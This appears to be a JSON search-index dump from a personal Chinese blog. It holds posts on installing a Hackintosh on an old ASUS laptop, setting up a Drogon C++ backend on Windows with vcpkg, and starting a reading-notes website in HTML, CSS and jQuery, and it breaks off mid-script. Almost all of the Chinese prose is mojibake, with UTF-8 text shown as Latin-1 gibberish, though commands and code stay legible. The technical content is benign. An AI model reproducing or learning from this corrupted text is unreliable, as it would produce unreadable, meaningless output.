0xE2å•å…ƒï¼Œå¼€å¯CFGé”ä¹‹åï¼ŒMSRï¼ˆç‰¹å®šæ¨¡å—å¯„å­˜å™¨ï¼Œç”¨æ¥æ§åˆ¶CPUçš„å·¥ä½œç¯å¢ƒå’Œè¯»å–å·¥ä½œçŠ¶æ€ï¼‰çš„0xE2å•å…ƒå°±ä¸èƒ½å†™å…¥äº†ã€‚ä¸è¿‡è‹¹æœç³»ç»Ÿé€šè¿‡è¿™ä¸ªå•å…ƒæ¥ç®¡ç†ç”µæºï¼ä¸èƒ½å†™å…¥çš„è¯å¯å°±éº»çƒ¦äº†ï¼Œéœ€è¦è§£é”ï¼\nåœ¨æˆ‘çš„æœºå‹ä¸­ï¼ŒæŒ‰ç…§EFIæ–‡ä»¶é‚£ä¸ªä»“åº“é‡Œé¢çš„åšæ³•è§£é”å³å¯ã€‚\nStep 3 ä¿®æ”¹config.plist è¿™ä¸€æ­¥å°±åœ¨ Videoæ•™ç¨‹ é‡Œé¢è€Œå·²ï¼Œä¸»è¦å°±æ˜¯æ”¹ä¸€ä¸‹ ä¸‰ç  ï¼Œç…§ç€åšå³å¯ï¼\nStep 4 ç¦ç”¨å„ç§BIOSé€‰é¡¹ é‡è¦ï¼æˆ‘åˆšå¼€å§‹åšçš„æ—¶å€™å°±æ˜¯å› ä¸ºæ¼æ‰æŸäº›é€‰é¡¹æ²¡æœ‰ç¦ï¼Œæå¾—ç³»ç»Ÿä¸€ç›´è£…ä¸ä¸Šï¼\næ•™ç¨‹é‡Œé¢æœ‰æ¸…å•çš„ï¼Œæˆ–è€…æŒ‰ç…§ä¸‹å›¾çš„é€‰é¡¹é€ä¸€ç¦ç”¨ï¼š\nImg Step 5 æ”¹Mindate é‡è¦ï¼OpenCoreåœ¨å¼•å¯¼çš„æ—¶å€™ï¼Œå±…ç„¶å¯¹ç³»ç»Ÿç‰ˆæœ¬è¿›è¡Œäº†é™åˆ¶ã€‚è¦å‚è€ƒ è¿™ç¯‡æ–‡ç«  æ¥æŠŠé™åˆ¶å…³é—­æ‰ã€‚\nStep 6 å®‰è£… ç›´æ¥Uç›˜å¯åŠ¨å•Šï¼So Easyï¼\nå®‰è£…è¿‡ç¨‹ä¸­æœ‰ä¸€äº›å°æ’æ›²ï¼š\nç£ç›˜è¯†åˆ«ä¸åˆ°ã€‚å› ä¸ºåŸæœ¬çš„Win10ç³»ç»Ÿç”¨çš„æ˜¯MBRåˆ†åŒºï¼Œè€ŒMacåªèƒ½è¯†åˆ«GPTåˆ†åŒºï¼Œæå¾—æˆ‘ç‰¹åˆ«éš¾å—ã€‚åé¢é‡æ–°åˆ¶ä½œäº†ä¸ªWindowsçš„å¯åŠ¨ç›˜ï¼Œåœ¨å®‰è£…ç•Œé¢ç”¨äº†å‘½ä»¤è¡Œæ“ä½œæŠŠç£ç›˜é‡æ–°æ ¼å¼åŒ–äº†ï¼Œç„¶åæ‰é‡æ–°å¼€å§‹Macçš„å®‰è£…ã€‚è¯¦è§ æ­¤ç¯‡ ï¼Œåªèƒ½è¯´CSDNå¶å°”è¿˜æ˜¯æœ‰ç‚¹å¥½ä¸œè¥¿ ğŸ˜ å®‰è£…å®Œæ¯•ä¹‹åè¿›ä¸äº†ç³»ç»Ÿï¼Œé‡å¯çš„æ—¶å€™è¿˜æ˜¯åªèƒ½ä»Uç›˜è¿›å…¥æ¢å¤æ¨¡å¼ã€‚è¿™ä¸ªé—®é¢˜éå¸¸çƒ¦äººï¼Œä½¿æˆ‘é‡è£…äº†Néç³»ç»Ÿï¼ˆä¸ºæˆ‘çš„ç¡¬ç›˜æ„Ÿåˆ°å¿§ä¼¤ï¼‰ï¼Œä¸€åº¦ä½¿æˆ‘æƒ³è¦æ”¾å¼ƒï¼Œæœ€åæŒ‰ç…§ä¸Šä¸€æ­¥çš„æŒ‡ç¤ºæŠŠMindateæ”¹æ‰å³å¯ã€‚ Step 7 æ›´æ–°Wi-Fié©±åŠ¨ æˆ‘çš„ç½‘å¡æ˜¯åŸè£…çš„AR9565ï¼ŒæŒ‰ç…§ è¿™ç¯‡æ–‡ç«  å®Œç¾æå®šWi-Fié©±åŠ¨ã€‚\nStep 8 æ€»ç»“ ç›®å‰è¿˜æœ‰ä¸€äº›å°é—®é¢˜æ²¡æœ‰è§£å†³ï¼ˆä¸æƒ³è§£å†³äº†ï¼Œç³»ç»Ÿèƒ½ç¨³å®šä½¿ç”¨å°±å¥½ï¼‰ï¼š\nç¡çœ ç§’é†’ã€‚æ®è¯´è¦å®šåˆ¶USBï¼Œåˆå¾—æŠ˜è…¾é©±åŠ¨ï¼Œæˆ‘çš„ç³»ç»Ÿå·²ç»åŠæŠ•å…¥ç”Ÿäº§äº†ï¼Œæœ‰é£é™©ä¸æï¼› å…³æœºç­‰äºé‡å¯ã€‚è¿™ä¸ªè¿˜æ˜¯æ¯”è¾ƒä¼¤ï¼Œä¸è¿‡é—®é¢˜å¹¶ä¸å¤§ï¼Œä¸€å¤©ä¹Ÿå°±è¢«æ¶å¿ƒè¿™ä¹ˆä¸€æ¬¡ï¼Œå…³æœºé‡å¯ä¹‹åå†ä»å¼•å¯¼ç•Œé¢å…³ä¸€æ¬¡å°±å¥½ã€‚ åŒæ—¶ä»¤æˆ‘æƒŠå–œçš„ç‚¹è¿˜æ˜¯æ¯”è¾ƒå¤šçš„ï¼š\nå£°å¡ã€éº¦å…‹é£ã€é”®é¼ ã€USBå‡å¼€ç®±å³ç”¨ï¼›Wi-Fiæ›´æ–°é©±åŠ¨åŸºæœ¬ä¸è´¹åŠ›ï¼Œæ€»ä½“å…·å¤‡ä¸€å°ç”µè„‘90%èƒ½åŠ›ï¼› MacçœŸå¿ƒå¥½çœ‹ï¼›å¥½çš„è®¾è®¡å¯èƒ½æ˜¯è¶‹åŒçš„ï¼Œè‡³å°‘Win11ç¡®å®æœ‰å¾ˆå¤§çš„â€œæœå‘³â€ï¼›å·²åœ¨App Storeè´­å…¥åŠ¨æ€å£çº¸å¼•æ“ã€‚ Desktop 2021-05-24æ›´æ–°\nHackintoshå·²ä½¿ç”¨ä¸‰ä¸ªæœˆæœ‰ä½™ï¼Œç”šè‡³å·²ç»ä¹ æƒ¯äº†è¿™ä¸ªç³»ç»Ÿå¥‡æ€ªçš„å¿«æ·é”®é€»è¾‘ã€‚æœ€è¿‘çˆ¶äº²çš„è€ç”µè„‘åäº†ï¼Œæˆ‘çš„è¿™å°ASUS FL8000Uå¤§æ¦‚ä¹Ÿå°†è¦å®Œæˆå®ƒåœ¨æˆ‘è¿™çš„ä½¿å‘½ï¼Œè€Œäº¤ç”±æˆ‘çš„çˆ¶æ¯ç»§ç»­ä½¿ç”¨ã€‚\nä¼´æˆ‘å››å¹´çš„ç”µè„‘ï¼Œå¯ä»¥è¯´æ˜¯æˆ‘å¤§å­¦æˆé•¿çš„è§è¯è€…ï¼›Hackintoshæ˜¯å®ƒç»½æ”¾å‡ºçš„æœ€åä¸€æŠ¹å…‰å’Œçƒ­ï¼Œåœ¨æ­¤æŠŠæˆ‘ç©è¿‡çš„æœ€åä¸€äº›å†…å®¹è®°å½•å®Œï¼Œä¾¿ä¸å®ƒå‘Šåˆ«äº†ã€‚\nStep9 USBå®šåˆ¶ åˆšè£…ä¸Šè¿™ä¸ªç³»ç»Ÿæ—¶å­˜åœ¨ç¡çœ ç§’é†’å’Œå…³æœºå˜é‡å¯çš„é—®é¢˜ï¼Œè¿™ä¸ªé—®é¢˜è¦é€šè¿‡USBå®šåˆ¶æ¥è§£å†³ã€‚\né¦–å…ˆï¼ŒHackintoshä¸Šåº”è¯¥è£…ä¸ŠOpen Core Configuratorå’ŒHackintoolè¿™ä¸¤æ¬¾è½¯ä»¶ï¼Œå‰è€…ç”¨äºä¿®æ”¹OCå¼•å¯¼æ–‡ä»¶ï¼Œåè€…ç”¨äºå®ŒæˆUSBå®šåˆ¶æ­¥éª¤ã€‚\nç›´æ¥å‚ç…§ ä½¿ç”¨ Hackintool å®šåˆ¶é»‘è‹¹æœ USB ç«¯å£ï¼Œé€‚ç”¨äº Clover \u0026amp; OpenCore-é»‘è‹¹æœæ˜Ÿçƒ (heipg.cn) è¿™ç¯‡æ–‡ç« å³å¯ï¼Œæˆ‘çš„è€ç”µè„‘å…¨æ˜¯USB 2æ¥å£ï¼Œå·¥åºå¾ˆç®€å•ã€‚\nStep10 ç³»ç»Ÿå‡çº§ ä¹‹å‰è£…çš„ç³»ç»Ÿæ˜¯Catalinaï¼Œè¿™ä¸ªç³»ç»Ÿä¸Šç°åœ¨å·²ç»è£…ä¸äº†iWorksåŠå…¬è½¯ä»¶äº†ï¼›è¿‘æœŸå†™è®ºæ–‡ã€åšPPTå…¨éƒ½ä½¿ç”¨WPSï¼Œä½“éªŒè·ŸOfficeäº§ç”Ÿäº†æ¯”è¾ƒå¤§çš„å‰²è£‚ï¼Œç—›è‹¦ã€‚\næ’ä¸€å˜´ï¼šå†™è®ºæ–‡æœŸé—´ï¼Œåˆ†åˆ«å°è¯•äº†Officeã€WPSã€Office365ï¼Œå„æœ‰å„çš„ä¸åŒï¼Œå°±å¾ˆç¦»è°±ã€‚æŠ›å¼€UIé€»è¾‘ä¸è°ˆï¼Œè¿åŒä¸€ä»½Wordéƒ½èƒ½ç»™æˆ‘è§£æå‡ºä¸åŒçš„æ’ç‰ˆï¼Œæˆ‘æ˜¯çœŸçš„æœæ°”ã€‚ä¸ªäººæ„Ÿè§‰Office365æœ€ç³Ÿå¿ƒï¼Œåœ¨ç½‘ç›˜ä¸Šåšå‡ºçš„ä¿®æ”¹ä¼¼ä¹è«åå…¶å¦™å°±ä¸¢å¤±äº†ï¼Œè¦ä¹ˆå°±æ˜¯æ–‡å­—è¿˜åœ¨ï¼Œæ ¼å¼æ²¡äº†ï¼Œç»™æˆ‘çœ‹ç¬‘äº†ï¼›WPSæ¬¡ä¹‹ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯WPS for Macæ¯”è¾ƒç‰¹æ®Šï¼Œåæ­£å°±æ˜¯å¾ˆéš¾å—ï¼Œæ ¼å¼ä¹Ÿæ˜¯å„ç§è·‘ä½ï¼Œæ“ä½œä¹Ÿä¸ä¸æ»‘ï¼›OfficeåŸç”Ÿä½“éªŒæœ€ä½³ï¼Œå¤§æŠµæ˜¯ç”¨å¾—ä¹ æƒ¯äº†å§ã€‚\nCatalinaä¼šè‡ªåŠ¨ä¸‹è½½Montereyæ›´æ–°ï¼Œä¸è¿‡æˆ‘å®³æ€•å®ƒå˜ç –ï¼Œä¸€ç›´ä¸æ•¢å®‰è£…ï¼›ç°åœ¨æ—¢ç„¶è¦é€€å½¹äº†ï¼Œå†³å®šè¯•éªŒæœ€åä¸€æ³¢ã€‚\nå®‰è£…ï¼\næˆåŠŸã€‚\nMonterey çœŸçš„å°±â€¦â€¦æ²¡å¾—è¯´ï¼Œæˆ‘æ²¡æƒ³åˆ°Hackintoshæ˜¯å¯ä»¥ç›´æ¥å‡çº§çš„ï¼Œé‡å¯äº†å‡ æ¬¡ä¹‹åï¼Œæˆ‘è¿›å…¥åˆ°MacOS Montereyçš„ç•Œé¢äº†ã€‚çœ‹æ¥æˆ‘çš„è¿™æ¬¡é»‘è‹¹æœä¹‹æ—…è¿˜æ˜¯æ¯”è¾ƒæˆåŠŸçš„ã€‚\nç¡çœ ç§’é†’é—®é¢˜ä¸å­˜åœ¨ï¼›Wifiæœä¸åˆ°ä¿¡å·ï¼Œè¿™ä¸ªé—®é¢˜ä¼°è®¡æ¢ä¸ªé©±åŠ¨å¯ä»¥è§£å†³ã€‚\nStep11 å‘Šåˆ« Montereyç•™åœ¨æˆ‘çš„ç”µè„‘ä¸Šä¸åˆ°ä¸€å°æ—¶ï¼Œå·²ç»è¦ä¸å®ƒå‘Šåˆ«äº†ã€‚\nå¹¶æ²¡æœ‰å¾ˆå¤šä¸œè¥¿æƒ³è¯´ï¼Œæ¯•ç«Ÿå°†æ¥è¿˜æ˜¯è¦ç»§ç»­ç©çš„ï¼›ä¸è¿‡è¿˜æ˜¯åº”è¯¥è·Ÿæˆ‘ä»»åŠ³ä»»æ€¨çš„è€ç”µè„‘è¯´ä¸€å¥ï¼šè¾›è‹¦äº†ï¼\n","date":"2022-02-22T00:00:00Z","permalink":"https://xrg.fj.cn/p/hackintosh%E5%B0%8F%E8%AE%B0/","title":"Hackintoshå°è®°"},{"content":"ä¹¦æ¥ä¸Šæ–‡ï¼Œå‰ç«¯æš‚å‘Šä¸€æ®µè½ä¹‹åå°±è¦å‡†å¤‡åç«¯äº†ã€‚\næˆ‘åŸæœ¬å·²ç»åœ¨æœåŠ¡å™¨ä¸Šç”¨Dockerè¿è¡Œè¿‡Drogonï¼Œä½†æ˜¯æœåŠ¡å™¨+vimçš„å¼€å‘ç¯å¢ƒå±å®æœ‰ç‚¹ä¸å¤ªç›´è§‚ï¼Œè¿˜æ˜¯å†³å®šåœ¨Windowsä¸Šä¹Ÿé…ä¸€ä¸ªDrogonç¯å¢ƒï¼Œç»“æœé‡åˆ°äº†ä¸å°‘å‘ï¼Œç¨åšè®°å½•ï¼Œæ˜¯ä¸ºç«™ç‚¹åç«¯ç¬¬ä¸€ç¯‡ã€‚\nStep0 ç¯å¢ƒé…ç½® VCPKGå®‰è£…+é›†æˆ ç¬¬ä¸€æ­¥æ˜¯å®‰è£…VCPKGï¼Œè¿™æ˜¯å¾®è½¯å¼€å‘çš„ä¸€æ¬¾C++è½¯ä»¶åŒ…ç®¡ç†å·¥å…·ï¼ŒDrogonå°±é€šè¿‡è¿™æ¬¾å·¥å…·ä¸‹è½½ã€‚\nå»åˆ° microsoft/vcpkg: C++ Library Manager for Windows, Linux, and MacOS (github.com) ä¸‹è½½ä»£ç æˆ–å…‹éš†ä»“åº“ï¼Œè¿è¡Œ bootstrap-vcpkg.bat å®Œæˆå®‰è£…ã€‚ä¼šç”Ÿæˆä¸€ä¸ª vcpkg.exe ï¼Œå¯ä»¥æ·»åŠ ç¯å¢ƒå˜é‡ä»¥ä¾¿å…¨å±€ä½¿ç”¨ã€‚\nä½¿ç”¨ vcpkg search drogon æ—¢å¯ä»¥åˆæ­¥è§‚å¯Ÿåˆ°Drogonåº“çš„æƒ…å†µï¼›åŒæ—¶ï¼Œè¿™æ¡å‘½ä»¤çš„é¡ºåˆ©è¿è¡Œä¹Ÿå°±è¡¨ç¤ºæˆ‘ä»¬çš„å®‰è£…å·²ç»æˆåŠŸã€‚\nvcpkgå®‰è£…æˆåŠŸ ä½¿ç”¨å‘½ä»¤ vcpkg integrate install å¯ä»¥å°†vcpkgè¿›è¡Œå…¨å±€é›†æˆï¼Œæ­¤åä»VCPKGä¸‹è½½çš„åº“éƒ½èƒ½åœ¨Visual Studioé‡Œé¢ç›´æ¥ä½¿ç”¨ã€‚å…¨å±€é›†æˆå¯ä»¥é€šè¿‡ vcpkg integrate remove æ¥ç§»é™¤ã€‚\nå¯¹äºå·¥ç¨‹é¡¹ç›®çš„é›†æˆï¼Œåº”è¯¥é€šè¿‡ vcpkg integrate project æ¥å®Œæˆï¼Œè¿™æ ·åœ¨å•ä¸€é¡¹ç›®ä¸­ä¸‹è½½çš„åº“ä¸ä¼šå½±å“åˆ°å…¶ä»–é¡¹ç›®ï¼Œè¾ƒä¸ºç†æƒ³ã€‚å…·ä½“åšæ³•å‚è§å‚è€ƒèµ„æ–™ [1] ï¼Œæˆ‘é€‰æ‹©ç›´æ¥ä½¿ç”¨å…¨å±€é›†æˆã€‚\nDrogonå®‰è£… ä½¿ç”¨å‘½ä»¤ vcpkg install drogon æˆ–å‘½ä»¤ vcpkg install drogon:x64-windows æ¥å®‰è£…Drogonï¼Œå‰è€…å®‰è£…çš„æ˜¯X86çš„åŒ…ï¼Œåè€…å®‰è£…çš„æ˜¯X64çš„åŒ…ã€‚\nå®‰è£…å®Œæˆä¹‹åï¼Œåº”è¯¥ä» [VCPKG PATH]\\installed\\x86-windows\\tools\\drogon æ–‡ä»¶å¤¹ä¸­æ‰¾åˆ° drogon_ctl å·¥å…·ï¼Œè¯¥å·¥å…·å¯ä»¥å¸®åŠ©æˆ‘ä»¬ç”ŸæˆDrogoné¡¹ç›®åŠä¸€ç³»åˆ—ç»„ä»¶ï¼Œå¾ˆæœ‰æ„ä¹‰ï¼›æˆ‘åœ¨åˆæ¬¡å®‰è£…çš„æ—¶å€™å¹¶æ²¡æœ‰æ‰¾åˆ°è¿™ä¸ªå·¥å…·ï¼Œé€šè¿‡ vcpkg install drogon[ctl] å®ç°æ‰‹åŠ¨å®‰è£…ã€‚\nè‡³æ­¤ï¼Œå¯ä»¥ä½¿ç”¨ drogon_ctl create project [ProjectName] æ¥åˆ›å»ºä¸€ä¸ªDrogoné¡¹ç›®äº†ã€‚\nStep1 è¿è¡Œ IDEé…ç½® å®Œæˆç¯å¢ƒçš„é…ç½®åˆ°å¯ä»¥è¿è¡Œï¼Œè¿˜éœ€è¦è‹¥å¹²æ­¥éª¤ï¼Œè€Œè¿™äº›æ­¥éª¤èŠ±è´¹äº†æˆ‘ç›¸å½“ä¸€äº›æ—¶é—´ï¼Œå› æ­¤æœ‰å¿…è¦äºˆä»¥è®°å½•ã€‚\nå‡å®šæˆ‘ä»¬å·²é€šè¿‡ drogon_ctl create project server æ¥åˆ›å»ºä¸€ä¸ªåä¸º server çš„é¡¹ç›®ï¼Œç¬¬ä¸€ä»¶äº‹æ˜¯ ä½¿ç”¨Visual Studioæ‰“å¼€è¯¥é¡¹ç›® ã€‚\nç”¨VS æ‰“å¼€æœ¬åœ°æ–‡ä»¶å¤¹ çš„æ–¹å¼æ‰“å¼€é¡¹ç›®ï¼ŒIDEè‡ªåŠ¨è¯†åˆ«è¯¥é¡¹ç›®ä¸ºCMakeé¡¹ç›®ï¼Œå®ŒæˆCMakeçš„ä¸€äº›å‰æœŸé…ç½®ã€‚\nç´§æ¥ç€å¹¶ä¸æ˜¯ç›´æ¥è¿è¡Œï¼Œè€Œæ˜¯é€šè¿‡ã€Projectã€‘\u0026ndash;\u0026gt;ã€CMake Settings for serverã€‘è¿™ä¸ªè·¯å¾„æ¥å®Œå–„CMakeçš„é…ç½®ï¼›åŠ¡å¿…åœ¨è¿™ä¸ªåœ°æ–¹å‹¾é€‰Drogonè·¯å¾„ï¼Œå¦åˆ™IDEæ— æ³•å®ŒæˆDrogonæ¡†æ¶çš„ç¼–è¯‘ã€‚\nå‹¾é€‰Drogonè·¯å¾„ è¿™é‡Œæœ€å‘çš„ä¸€ç‚¹æ˜¯ï¼Œå³ä¾¿æ²¡æœ‰å‹¾é€‰è¿™ä¸ªé€‰é¡¹ï¼Œä»ç„¶èƒ½å¤Ÿé€šè¿‡ç¼–è¯‘ã€ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½†ä½ æ·»åŠ çš„åŠŸèƒ½éƒ½æ²¡åŠæ³•ç”Ÿæ•ˆã€‚æˆ‘æ­¤å‰æ ¹æ®æ–‡æ¡£æ·»åŠ äº†ä¸€ä¸ªç®€å•çš„æ§åˆ¶å™¨ï¼Œç»“æœå¹¶æ²¡æœ‰èµ·ä½œç”¨ã€‚\né…ç½®æ–‡ä»¶ Drogoné¡¹ç›®ç”Ÿæˆçš„æ—¶å€™ï¼Œè‡ªå¸¦ä¸€ä¸ª config.json æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ç›®å‰è¿˜æ²¡æœ‰è¿›è¡Œæ·±å…¥çš„ç†è§£ï¼Œä½†æ˜¯æˆ‘è¿›è¡Œäº†ä»¥ä¸‹å‡ ç‚¹ï¼š\nå°† document_root æ”¹ä¸ºé™æ€æ¨¡æ¿çš„æ–‡ä»¶å¤¹ï¼Œé»˜è®¤é¡µé¢æ˜¯ index.html ä¸å˜ï¼›\næŠŠç¬¬ 230 è¡Œçš„ simple_controllers_map æ³¨é‡Šæ‰ï¼Œå› ä¸ºç›®å‰è¿˜ä¸éœ€è¦è¿›è¡Œæ§åˆ¶å™¨ã€è¿‡æ»¤å™¨ç­‰çš„æ·»åŠ ï¼š\n//\u0026#34;simple_controllers_map\u0026#34;: [ // { // \u0026#34;path\u0026#34;: \u0026#34;/path/name\u0026#34;, // \u0026#34;controller\u0026#34;: \u0026#34;controllerClassName\u0026#34;, // \u0026#34;http_methods\u0026#34;: [ // \u0026#34;get\u0026#34;, // \u0026#34;post\u0026#34; // ], // \u0026#34;filters\u0026#34;: [ // \u0026#34;FilterClassName\u0026#34; // ] // } //], ä¿®æ”¹ main.cc æ–‡ä»¶ï¼ŒæŠŠåŠ è½½é…ç½®æ–‡ä»¶çš„é‚£è¡Œä»£ç å–æ¶ˆæ³¨é‡Šï¼š\ndrogon::app().loadConfigFile(\u0026#34;../../../config.json\u0026#34;); è‡³æ­¤ï¼Œç¨‹åºå°±å¯ä»¥è¿è¡Œäº†ã€‚\nè¿è¡Œ ç›´æ¥é€šè¿‡VSç”Ÿæˆç›®æ ‡ç¨‹åºï¼Œå¯ä»¥å‚è€ƒèµ„æ–™ [2] è¿›è¡Œé™æ€é¡µé¢å’Œæ§åˆ¶å™¨çš„ç®€å•ä½¿ç”¨ã€‚\nå‚è€ƒèµ„æ–™ [1] Visual Studioå¼€æºåº“é›†æˆå™¨Vcpkgå…¨æ•™ç¨‹\u0026ndash;åˆ©ç”¨Vcpkgè½»æ¾é›†æˆå¼€æºç¬¬ä¸‰æ–¹åº“_chenjmçš„ä¸“æ -CSDNåšå®¢_vcpkg\n[2] CHN 03 å¿«é€Ÿå¼€å§‹ Â· drogonframework/drogon Wiki (github.com)\n","date":"2022-02-16T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E8%AF%BB%E4%B9%A6%E6%91%98%E6%8A%84%E7%AB%99%E7%82%B9%E6%9E%84%E5%BB%BA%E5%90%8E%E7%AB%AF%E7%AF%87%E4%B9%8B%E4%B8%80/","title":"è¯»ä¹¦æ‘˜æŠ„ç«™ç‚¹æ„å»ºï¼ˆåç«¯ç¯‡|ä¹‹ä¸€ï¼‰"},{"content":"ç»ˆäºä¸‹å®šå†³å¿ƒæ„å»ºä¸€ä¸ªå±äºè‡ªå·±çš„è¯»ä¹¦æ‘˜æŠ„ç«™ç‚¹äº†ï¼\næ­¤å‰çš„è¯»ä¹¦æ‘˜æŠ„ä¸€ç›´éƒ½æ˜¯å†™åœ¨ä¸€ä¸ªMarkdownæ–‡ä»¶é‡Œï¼Œç„¶åé€šè¿‡OneDriveåŒæ­¥ã€‚è¿™ç§åŸå§‹çš„åŠæ³•é—®é¢˜ä¸å¤§ï¼Œä½†å¾ˆä½æ•ˆï¼Œä¹Ÿè°ˆä¸ä¸Šè§†è§‰æ•ˆæœï¼›é¢å¯¹å¶å‘çš„è¦æŠŠæŸäº›æå¥½çš„ç‰‡æ®µåˆ†äº«ç»™å¥½å‹çš„éœ€æ±‚æ›´æ˜¯æ— èƒ½ä¸ºåŠ›ï¼Œåªèƒ½æˆªä¸ªå›¾å‹‰å¼ºä½œæ•°ã€‚\nä»ç°åœ¨å¼€å§‹å‘¢ï¼Œæˆ‘å¸Œæœ›ä¸€æ­¥æ­¥æ„å»ºä¸€ä¸‹å±äºè‡ªå·±çš„è¯»ä¹¦æ‘˜æŠ„ç«™ç‚¹ï¼›æ­¤å‰ä¹°çš„å¥½å‡ ä¸ªæœˆçš„è…¾è®¯äº‘æœåŠ¡å™¨ä¸€ç›´é—²ç½®ï¼Œè¿‘æœŸå¯èƒ½å°±æœ‰ä»–çš„ç”¨æ­¦ä¹‹åœ°äº†ã€‚\nå¼€å·¥å¤§å‰ï¼ â˜€ï¸\næ€»ä½“è§„åˆ’ è¿™æ¬¡è¦åšçš„è‚¯å®šæ˜¯ä¸€ä¸ªåŠ¨æ€ç½‘ç«™ï¼ˆIn fact, äººç”Ÿä¸­ç¬¬ä¸€ä¸ªåŠ¨æ€ç½‘ç«™ /(ã„’oã„’)/~~ï¼‰ï¼Œå¤§æ¦‚çš„å®æ–½è¦ç‚¹æ˜¯ï¼š\nå‰åç«¯åˆ†ç¦»ï¼ˆMaybeï¼‰ ä¸è®¾ç½®è´¦å·äº†ï¼Œå› ä¸ºä½¿ç”¨èŒƒå›´æ¯”è¾ƒç§äººï¼›å‘å¸ƒæ–‡ç« çš„æ¥å£æ˜¯æš´éœ²çš„ï¼Œä½†æ˜¯å‘å¸ƒæ‘˜æŠ„ä¹‹å‰è¦è¿›è¡Œèº«ä»½è®¤è¯ åŠ å¯†å‹ç¼©å­˜å‚¨ï¼ˆçœ‹åæœŸæŠ€æœ¯èƒ½åŠ›ï¼‰ æ•°æ®åº“å®šæœŸå¤‡ä»½ HTTPS å®ç°åˆ†äº«åŠŸèƒ½ å‰ç«¯å°½é‡é€‚åº”å¤šè®¾å¤‡ åŠ¨æ€åŠ è½½+åŠ è½½æ—¶çš„é¡µé¢åŠ¨ç”» å·²ç»ç‰©è‰²å¥½äº†åç«¯å¼€å‘çš„æ¡†æ¶ï¼š drogonframework/drogon: Drogon: A C++14/17/20 based HTTP web application framework running on Linux/macOS/Unix/Windows (github.com) ï¼Œæ„Ÿè§‰ç”¨C++å¼€å‘åç«¯éå¸¸é…·ç‚«ï¼Œæœ¬èº«éœ€è¦å®ç°çš„åŠŸèƒ½ä¹Ÿä¸æ˜¯å¾ˆå¤š ï¼Œå¤§æœ‰å¯ä¸ºï¼ ğŸ˜¼\nStep01 ä¸»ä½“æ¡†æ¶ åœ¨æˆ‘çš„æ„æ€ä¸­ï¼Œè¯»ä¹¦æ‘˜æŠ„é¡µé¢çš„ä¸»ä½“åº”è¯¥æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„ç»“æ„ï¼š\næ‘˜æŠ„åˆ—è¡¨ç±»ä¼¼äºæˆ‘ä¸ªäººåšå®¢çš„æ–‡ç« åˆ—è¡¨å°±è¡Œï¼› ç‚¹å‡»æŸä¸ªæ–‡æ®µä¹‹åï¼Œè§¦å‘ç¼©æ”¾æ•ˆæœï¼Œæ–‡æ®µæˆä¸ºé¡µé¢ä¸­å¿ƒï¼ŒåŒæ—¶èƒŒæ™¯è™šåŒ–ã€‚ æ­£åœ¨æˆ‘çŠ¹è±«è¿·èŒ«çš„æ—¶å€™ï¼Œå‘ç°äº† Steven å¤§ä½¬çš„ ã€CSSã€‘App Store å¡ç‰‡å±•å¼€æ•ˆæœ è§†é¢‘ï¼Amazingï¼\næˆ‘å¾ˆå¿«å†³å®šé¡µé¢ä¸»ä½“å°±åŸºäºä»–çš„è¿™ä¸ªè§†é¢‘äº†ã€‚ä¸‹é¢çš„å†…å®¹å‡è®¾ä½ å·²ç»å®ç°äº†Stevenåœ¨è§†é¢‘ä¸­ä»‹ç»çš„æ‰€æœ‰æ•ˆæœã€‚\næˆ‘ç…§ç€è§†é¢‘å®ç°çš„æ€»çš„ä»£ç ä¸ºï¼š\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en-us\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Test\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;https://fonts.googleapis.com\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;https://fonts.gstatic.com\u0026#34; crossorigin\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css2?family=Long+Cang\u0026amp;family=Ma+Shan+Zheng\u0026amp;family=Noto+Sans+SC:wght@300\u0026amp;family=Noto+Serif+SC:wght@300\u0026amp;family=Zhi+Mang+Xing\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;style\u0026gt; :root { font-size: 15px; font-family: \u0026#39;Zhi Mang Xing\u0026#39;, cursive; --body-width: 100%; --card-width: 420px; --card-height: 280px; --img-height: 226px; --img-height-expended: 320px; background-color: #333; } body { width: var(--body-width); background-color: #eee; margin: auto; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 1rem 0; } body.noscroll { overflow: hidden; } .card { width: var(--card-width); height: var(--card-height); background-color: #fff; border-radius: 1rem; box-shadow: 0 .2rem 2rem rgba(0, 0, 0, .1); margin: 1rem 0; transition: .3s all cubic-bezier(0, 1, 0.95, 1.05); } .card img { display: block; width: 100%; height: var(--img-height); object-fit: cover; border-top-left-radius: 1rem; border-top-right-radius: 1rem; } .card h4 { margin: 0; font-size: 1.5rem; font-weight: bold; padding: .8rem 1.2rem; background-color: #fff; line-height: 2rem; letter-spacing: -.5px; padding-bottom: 0; } .card .content-wrapper { height: 0; overflow: hidden; transition: .3s all ease-out; opacity: .8; } .card .content-wrapper .content { padding: 0 1.2rem; background-color: #fff; overflow: auto; } .card p { font-size: 1.2rem; line-height: 1.5rem; } /* active classes */ .card.active { transform: translateY(var(--data-offset-top)) scale(calc(480/420)); transform-origin: 50% 0; border-radius: 0; } .card.active h4 { padding-bottom: .8rem; } .card.active img { border-top-left-radius: 0; border-top-right-radius: 0; height: var(--img-height-expended); } .card.active .content-wrapper { height: 100vh; transition: .3s all ease-in; opacity: 1; } ::-webkit-scrollbar { width: 20px; } ::-webkit-scrollbar-track { background-color: transparent; } ::-webkit-scrollbar-thumb { background-color: #d6dee1; border-radius: 20px; border: 6px solid transparent; background-clip: content-box; } ::-webkit-scrollbar-thumb:hover { background-color: #a8bbbf; } \u0026lt;/style\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; window.onload = function() { $(\u0026#39;.card\u0026#39;).on(\u0026#39;click\u0026#39;, function (e) { let card = 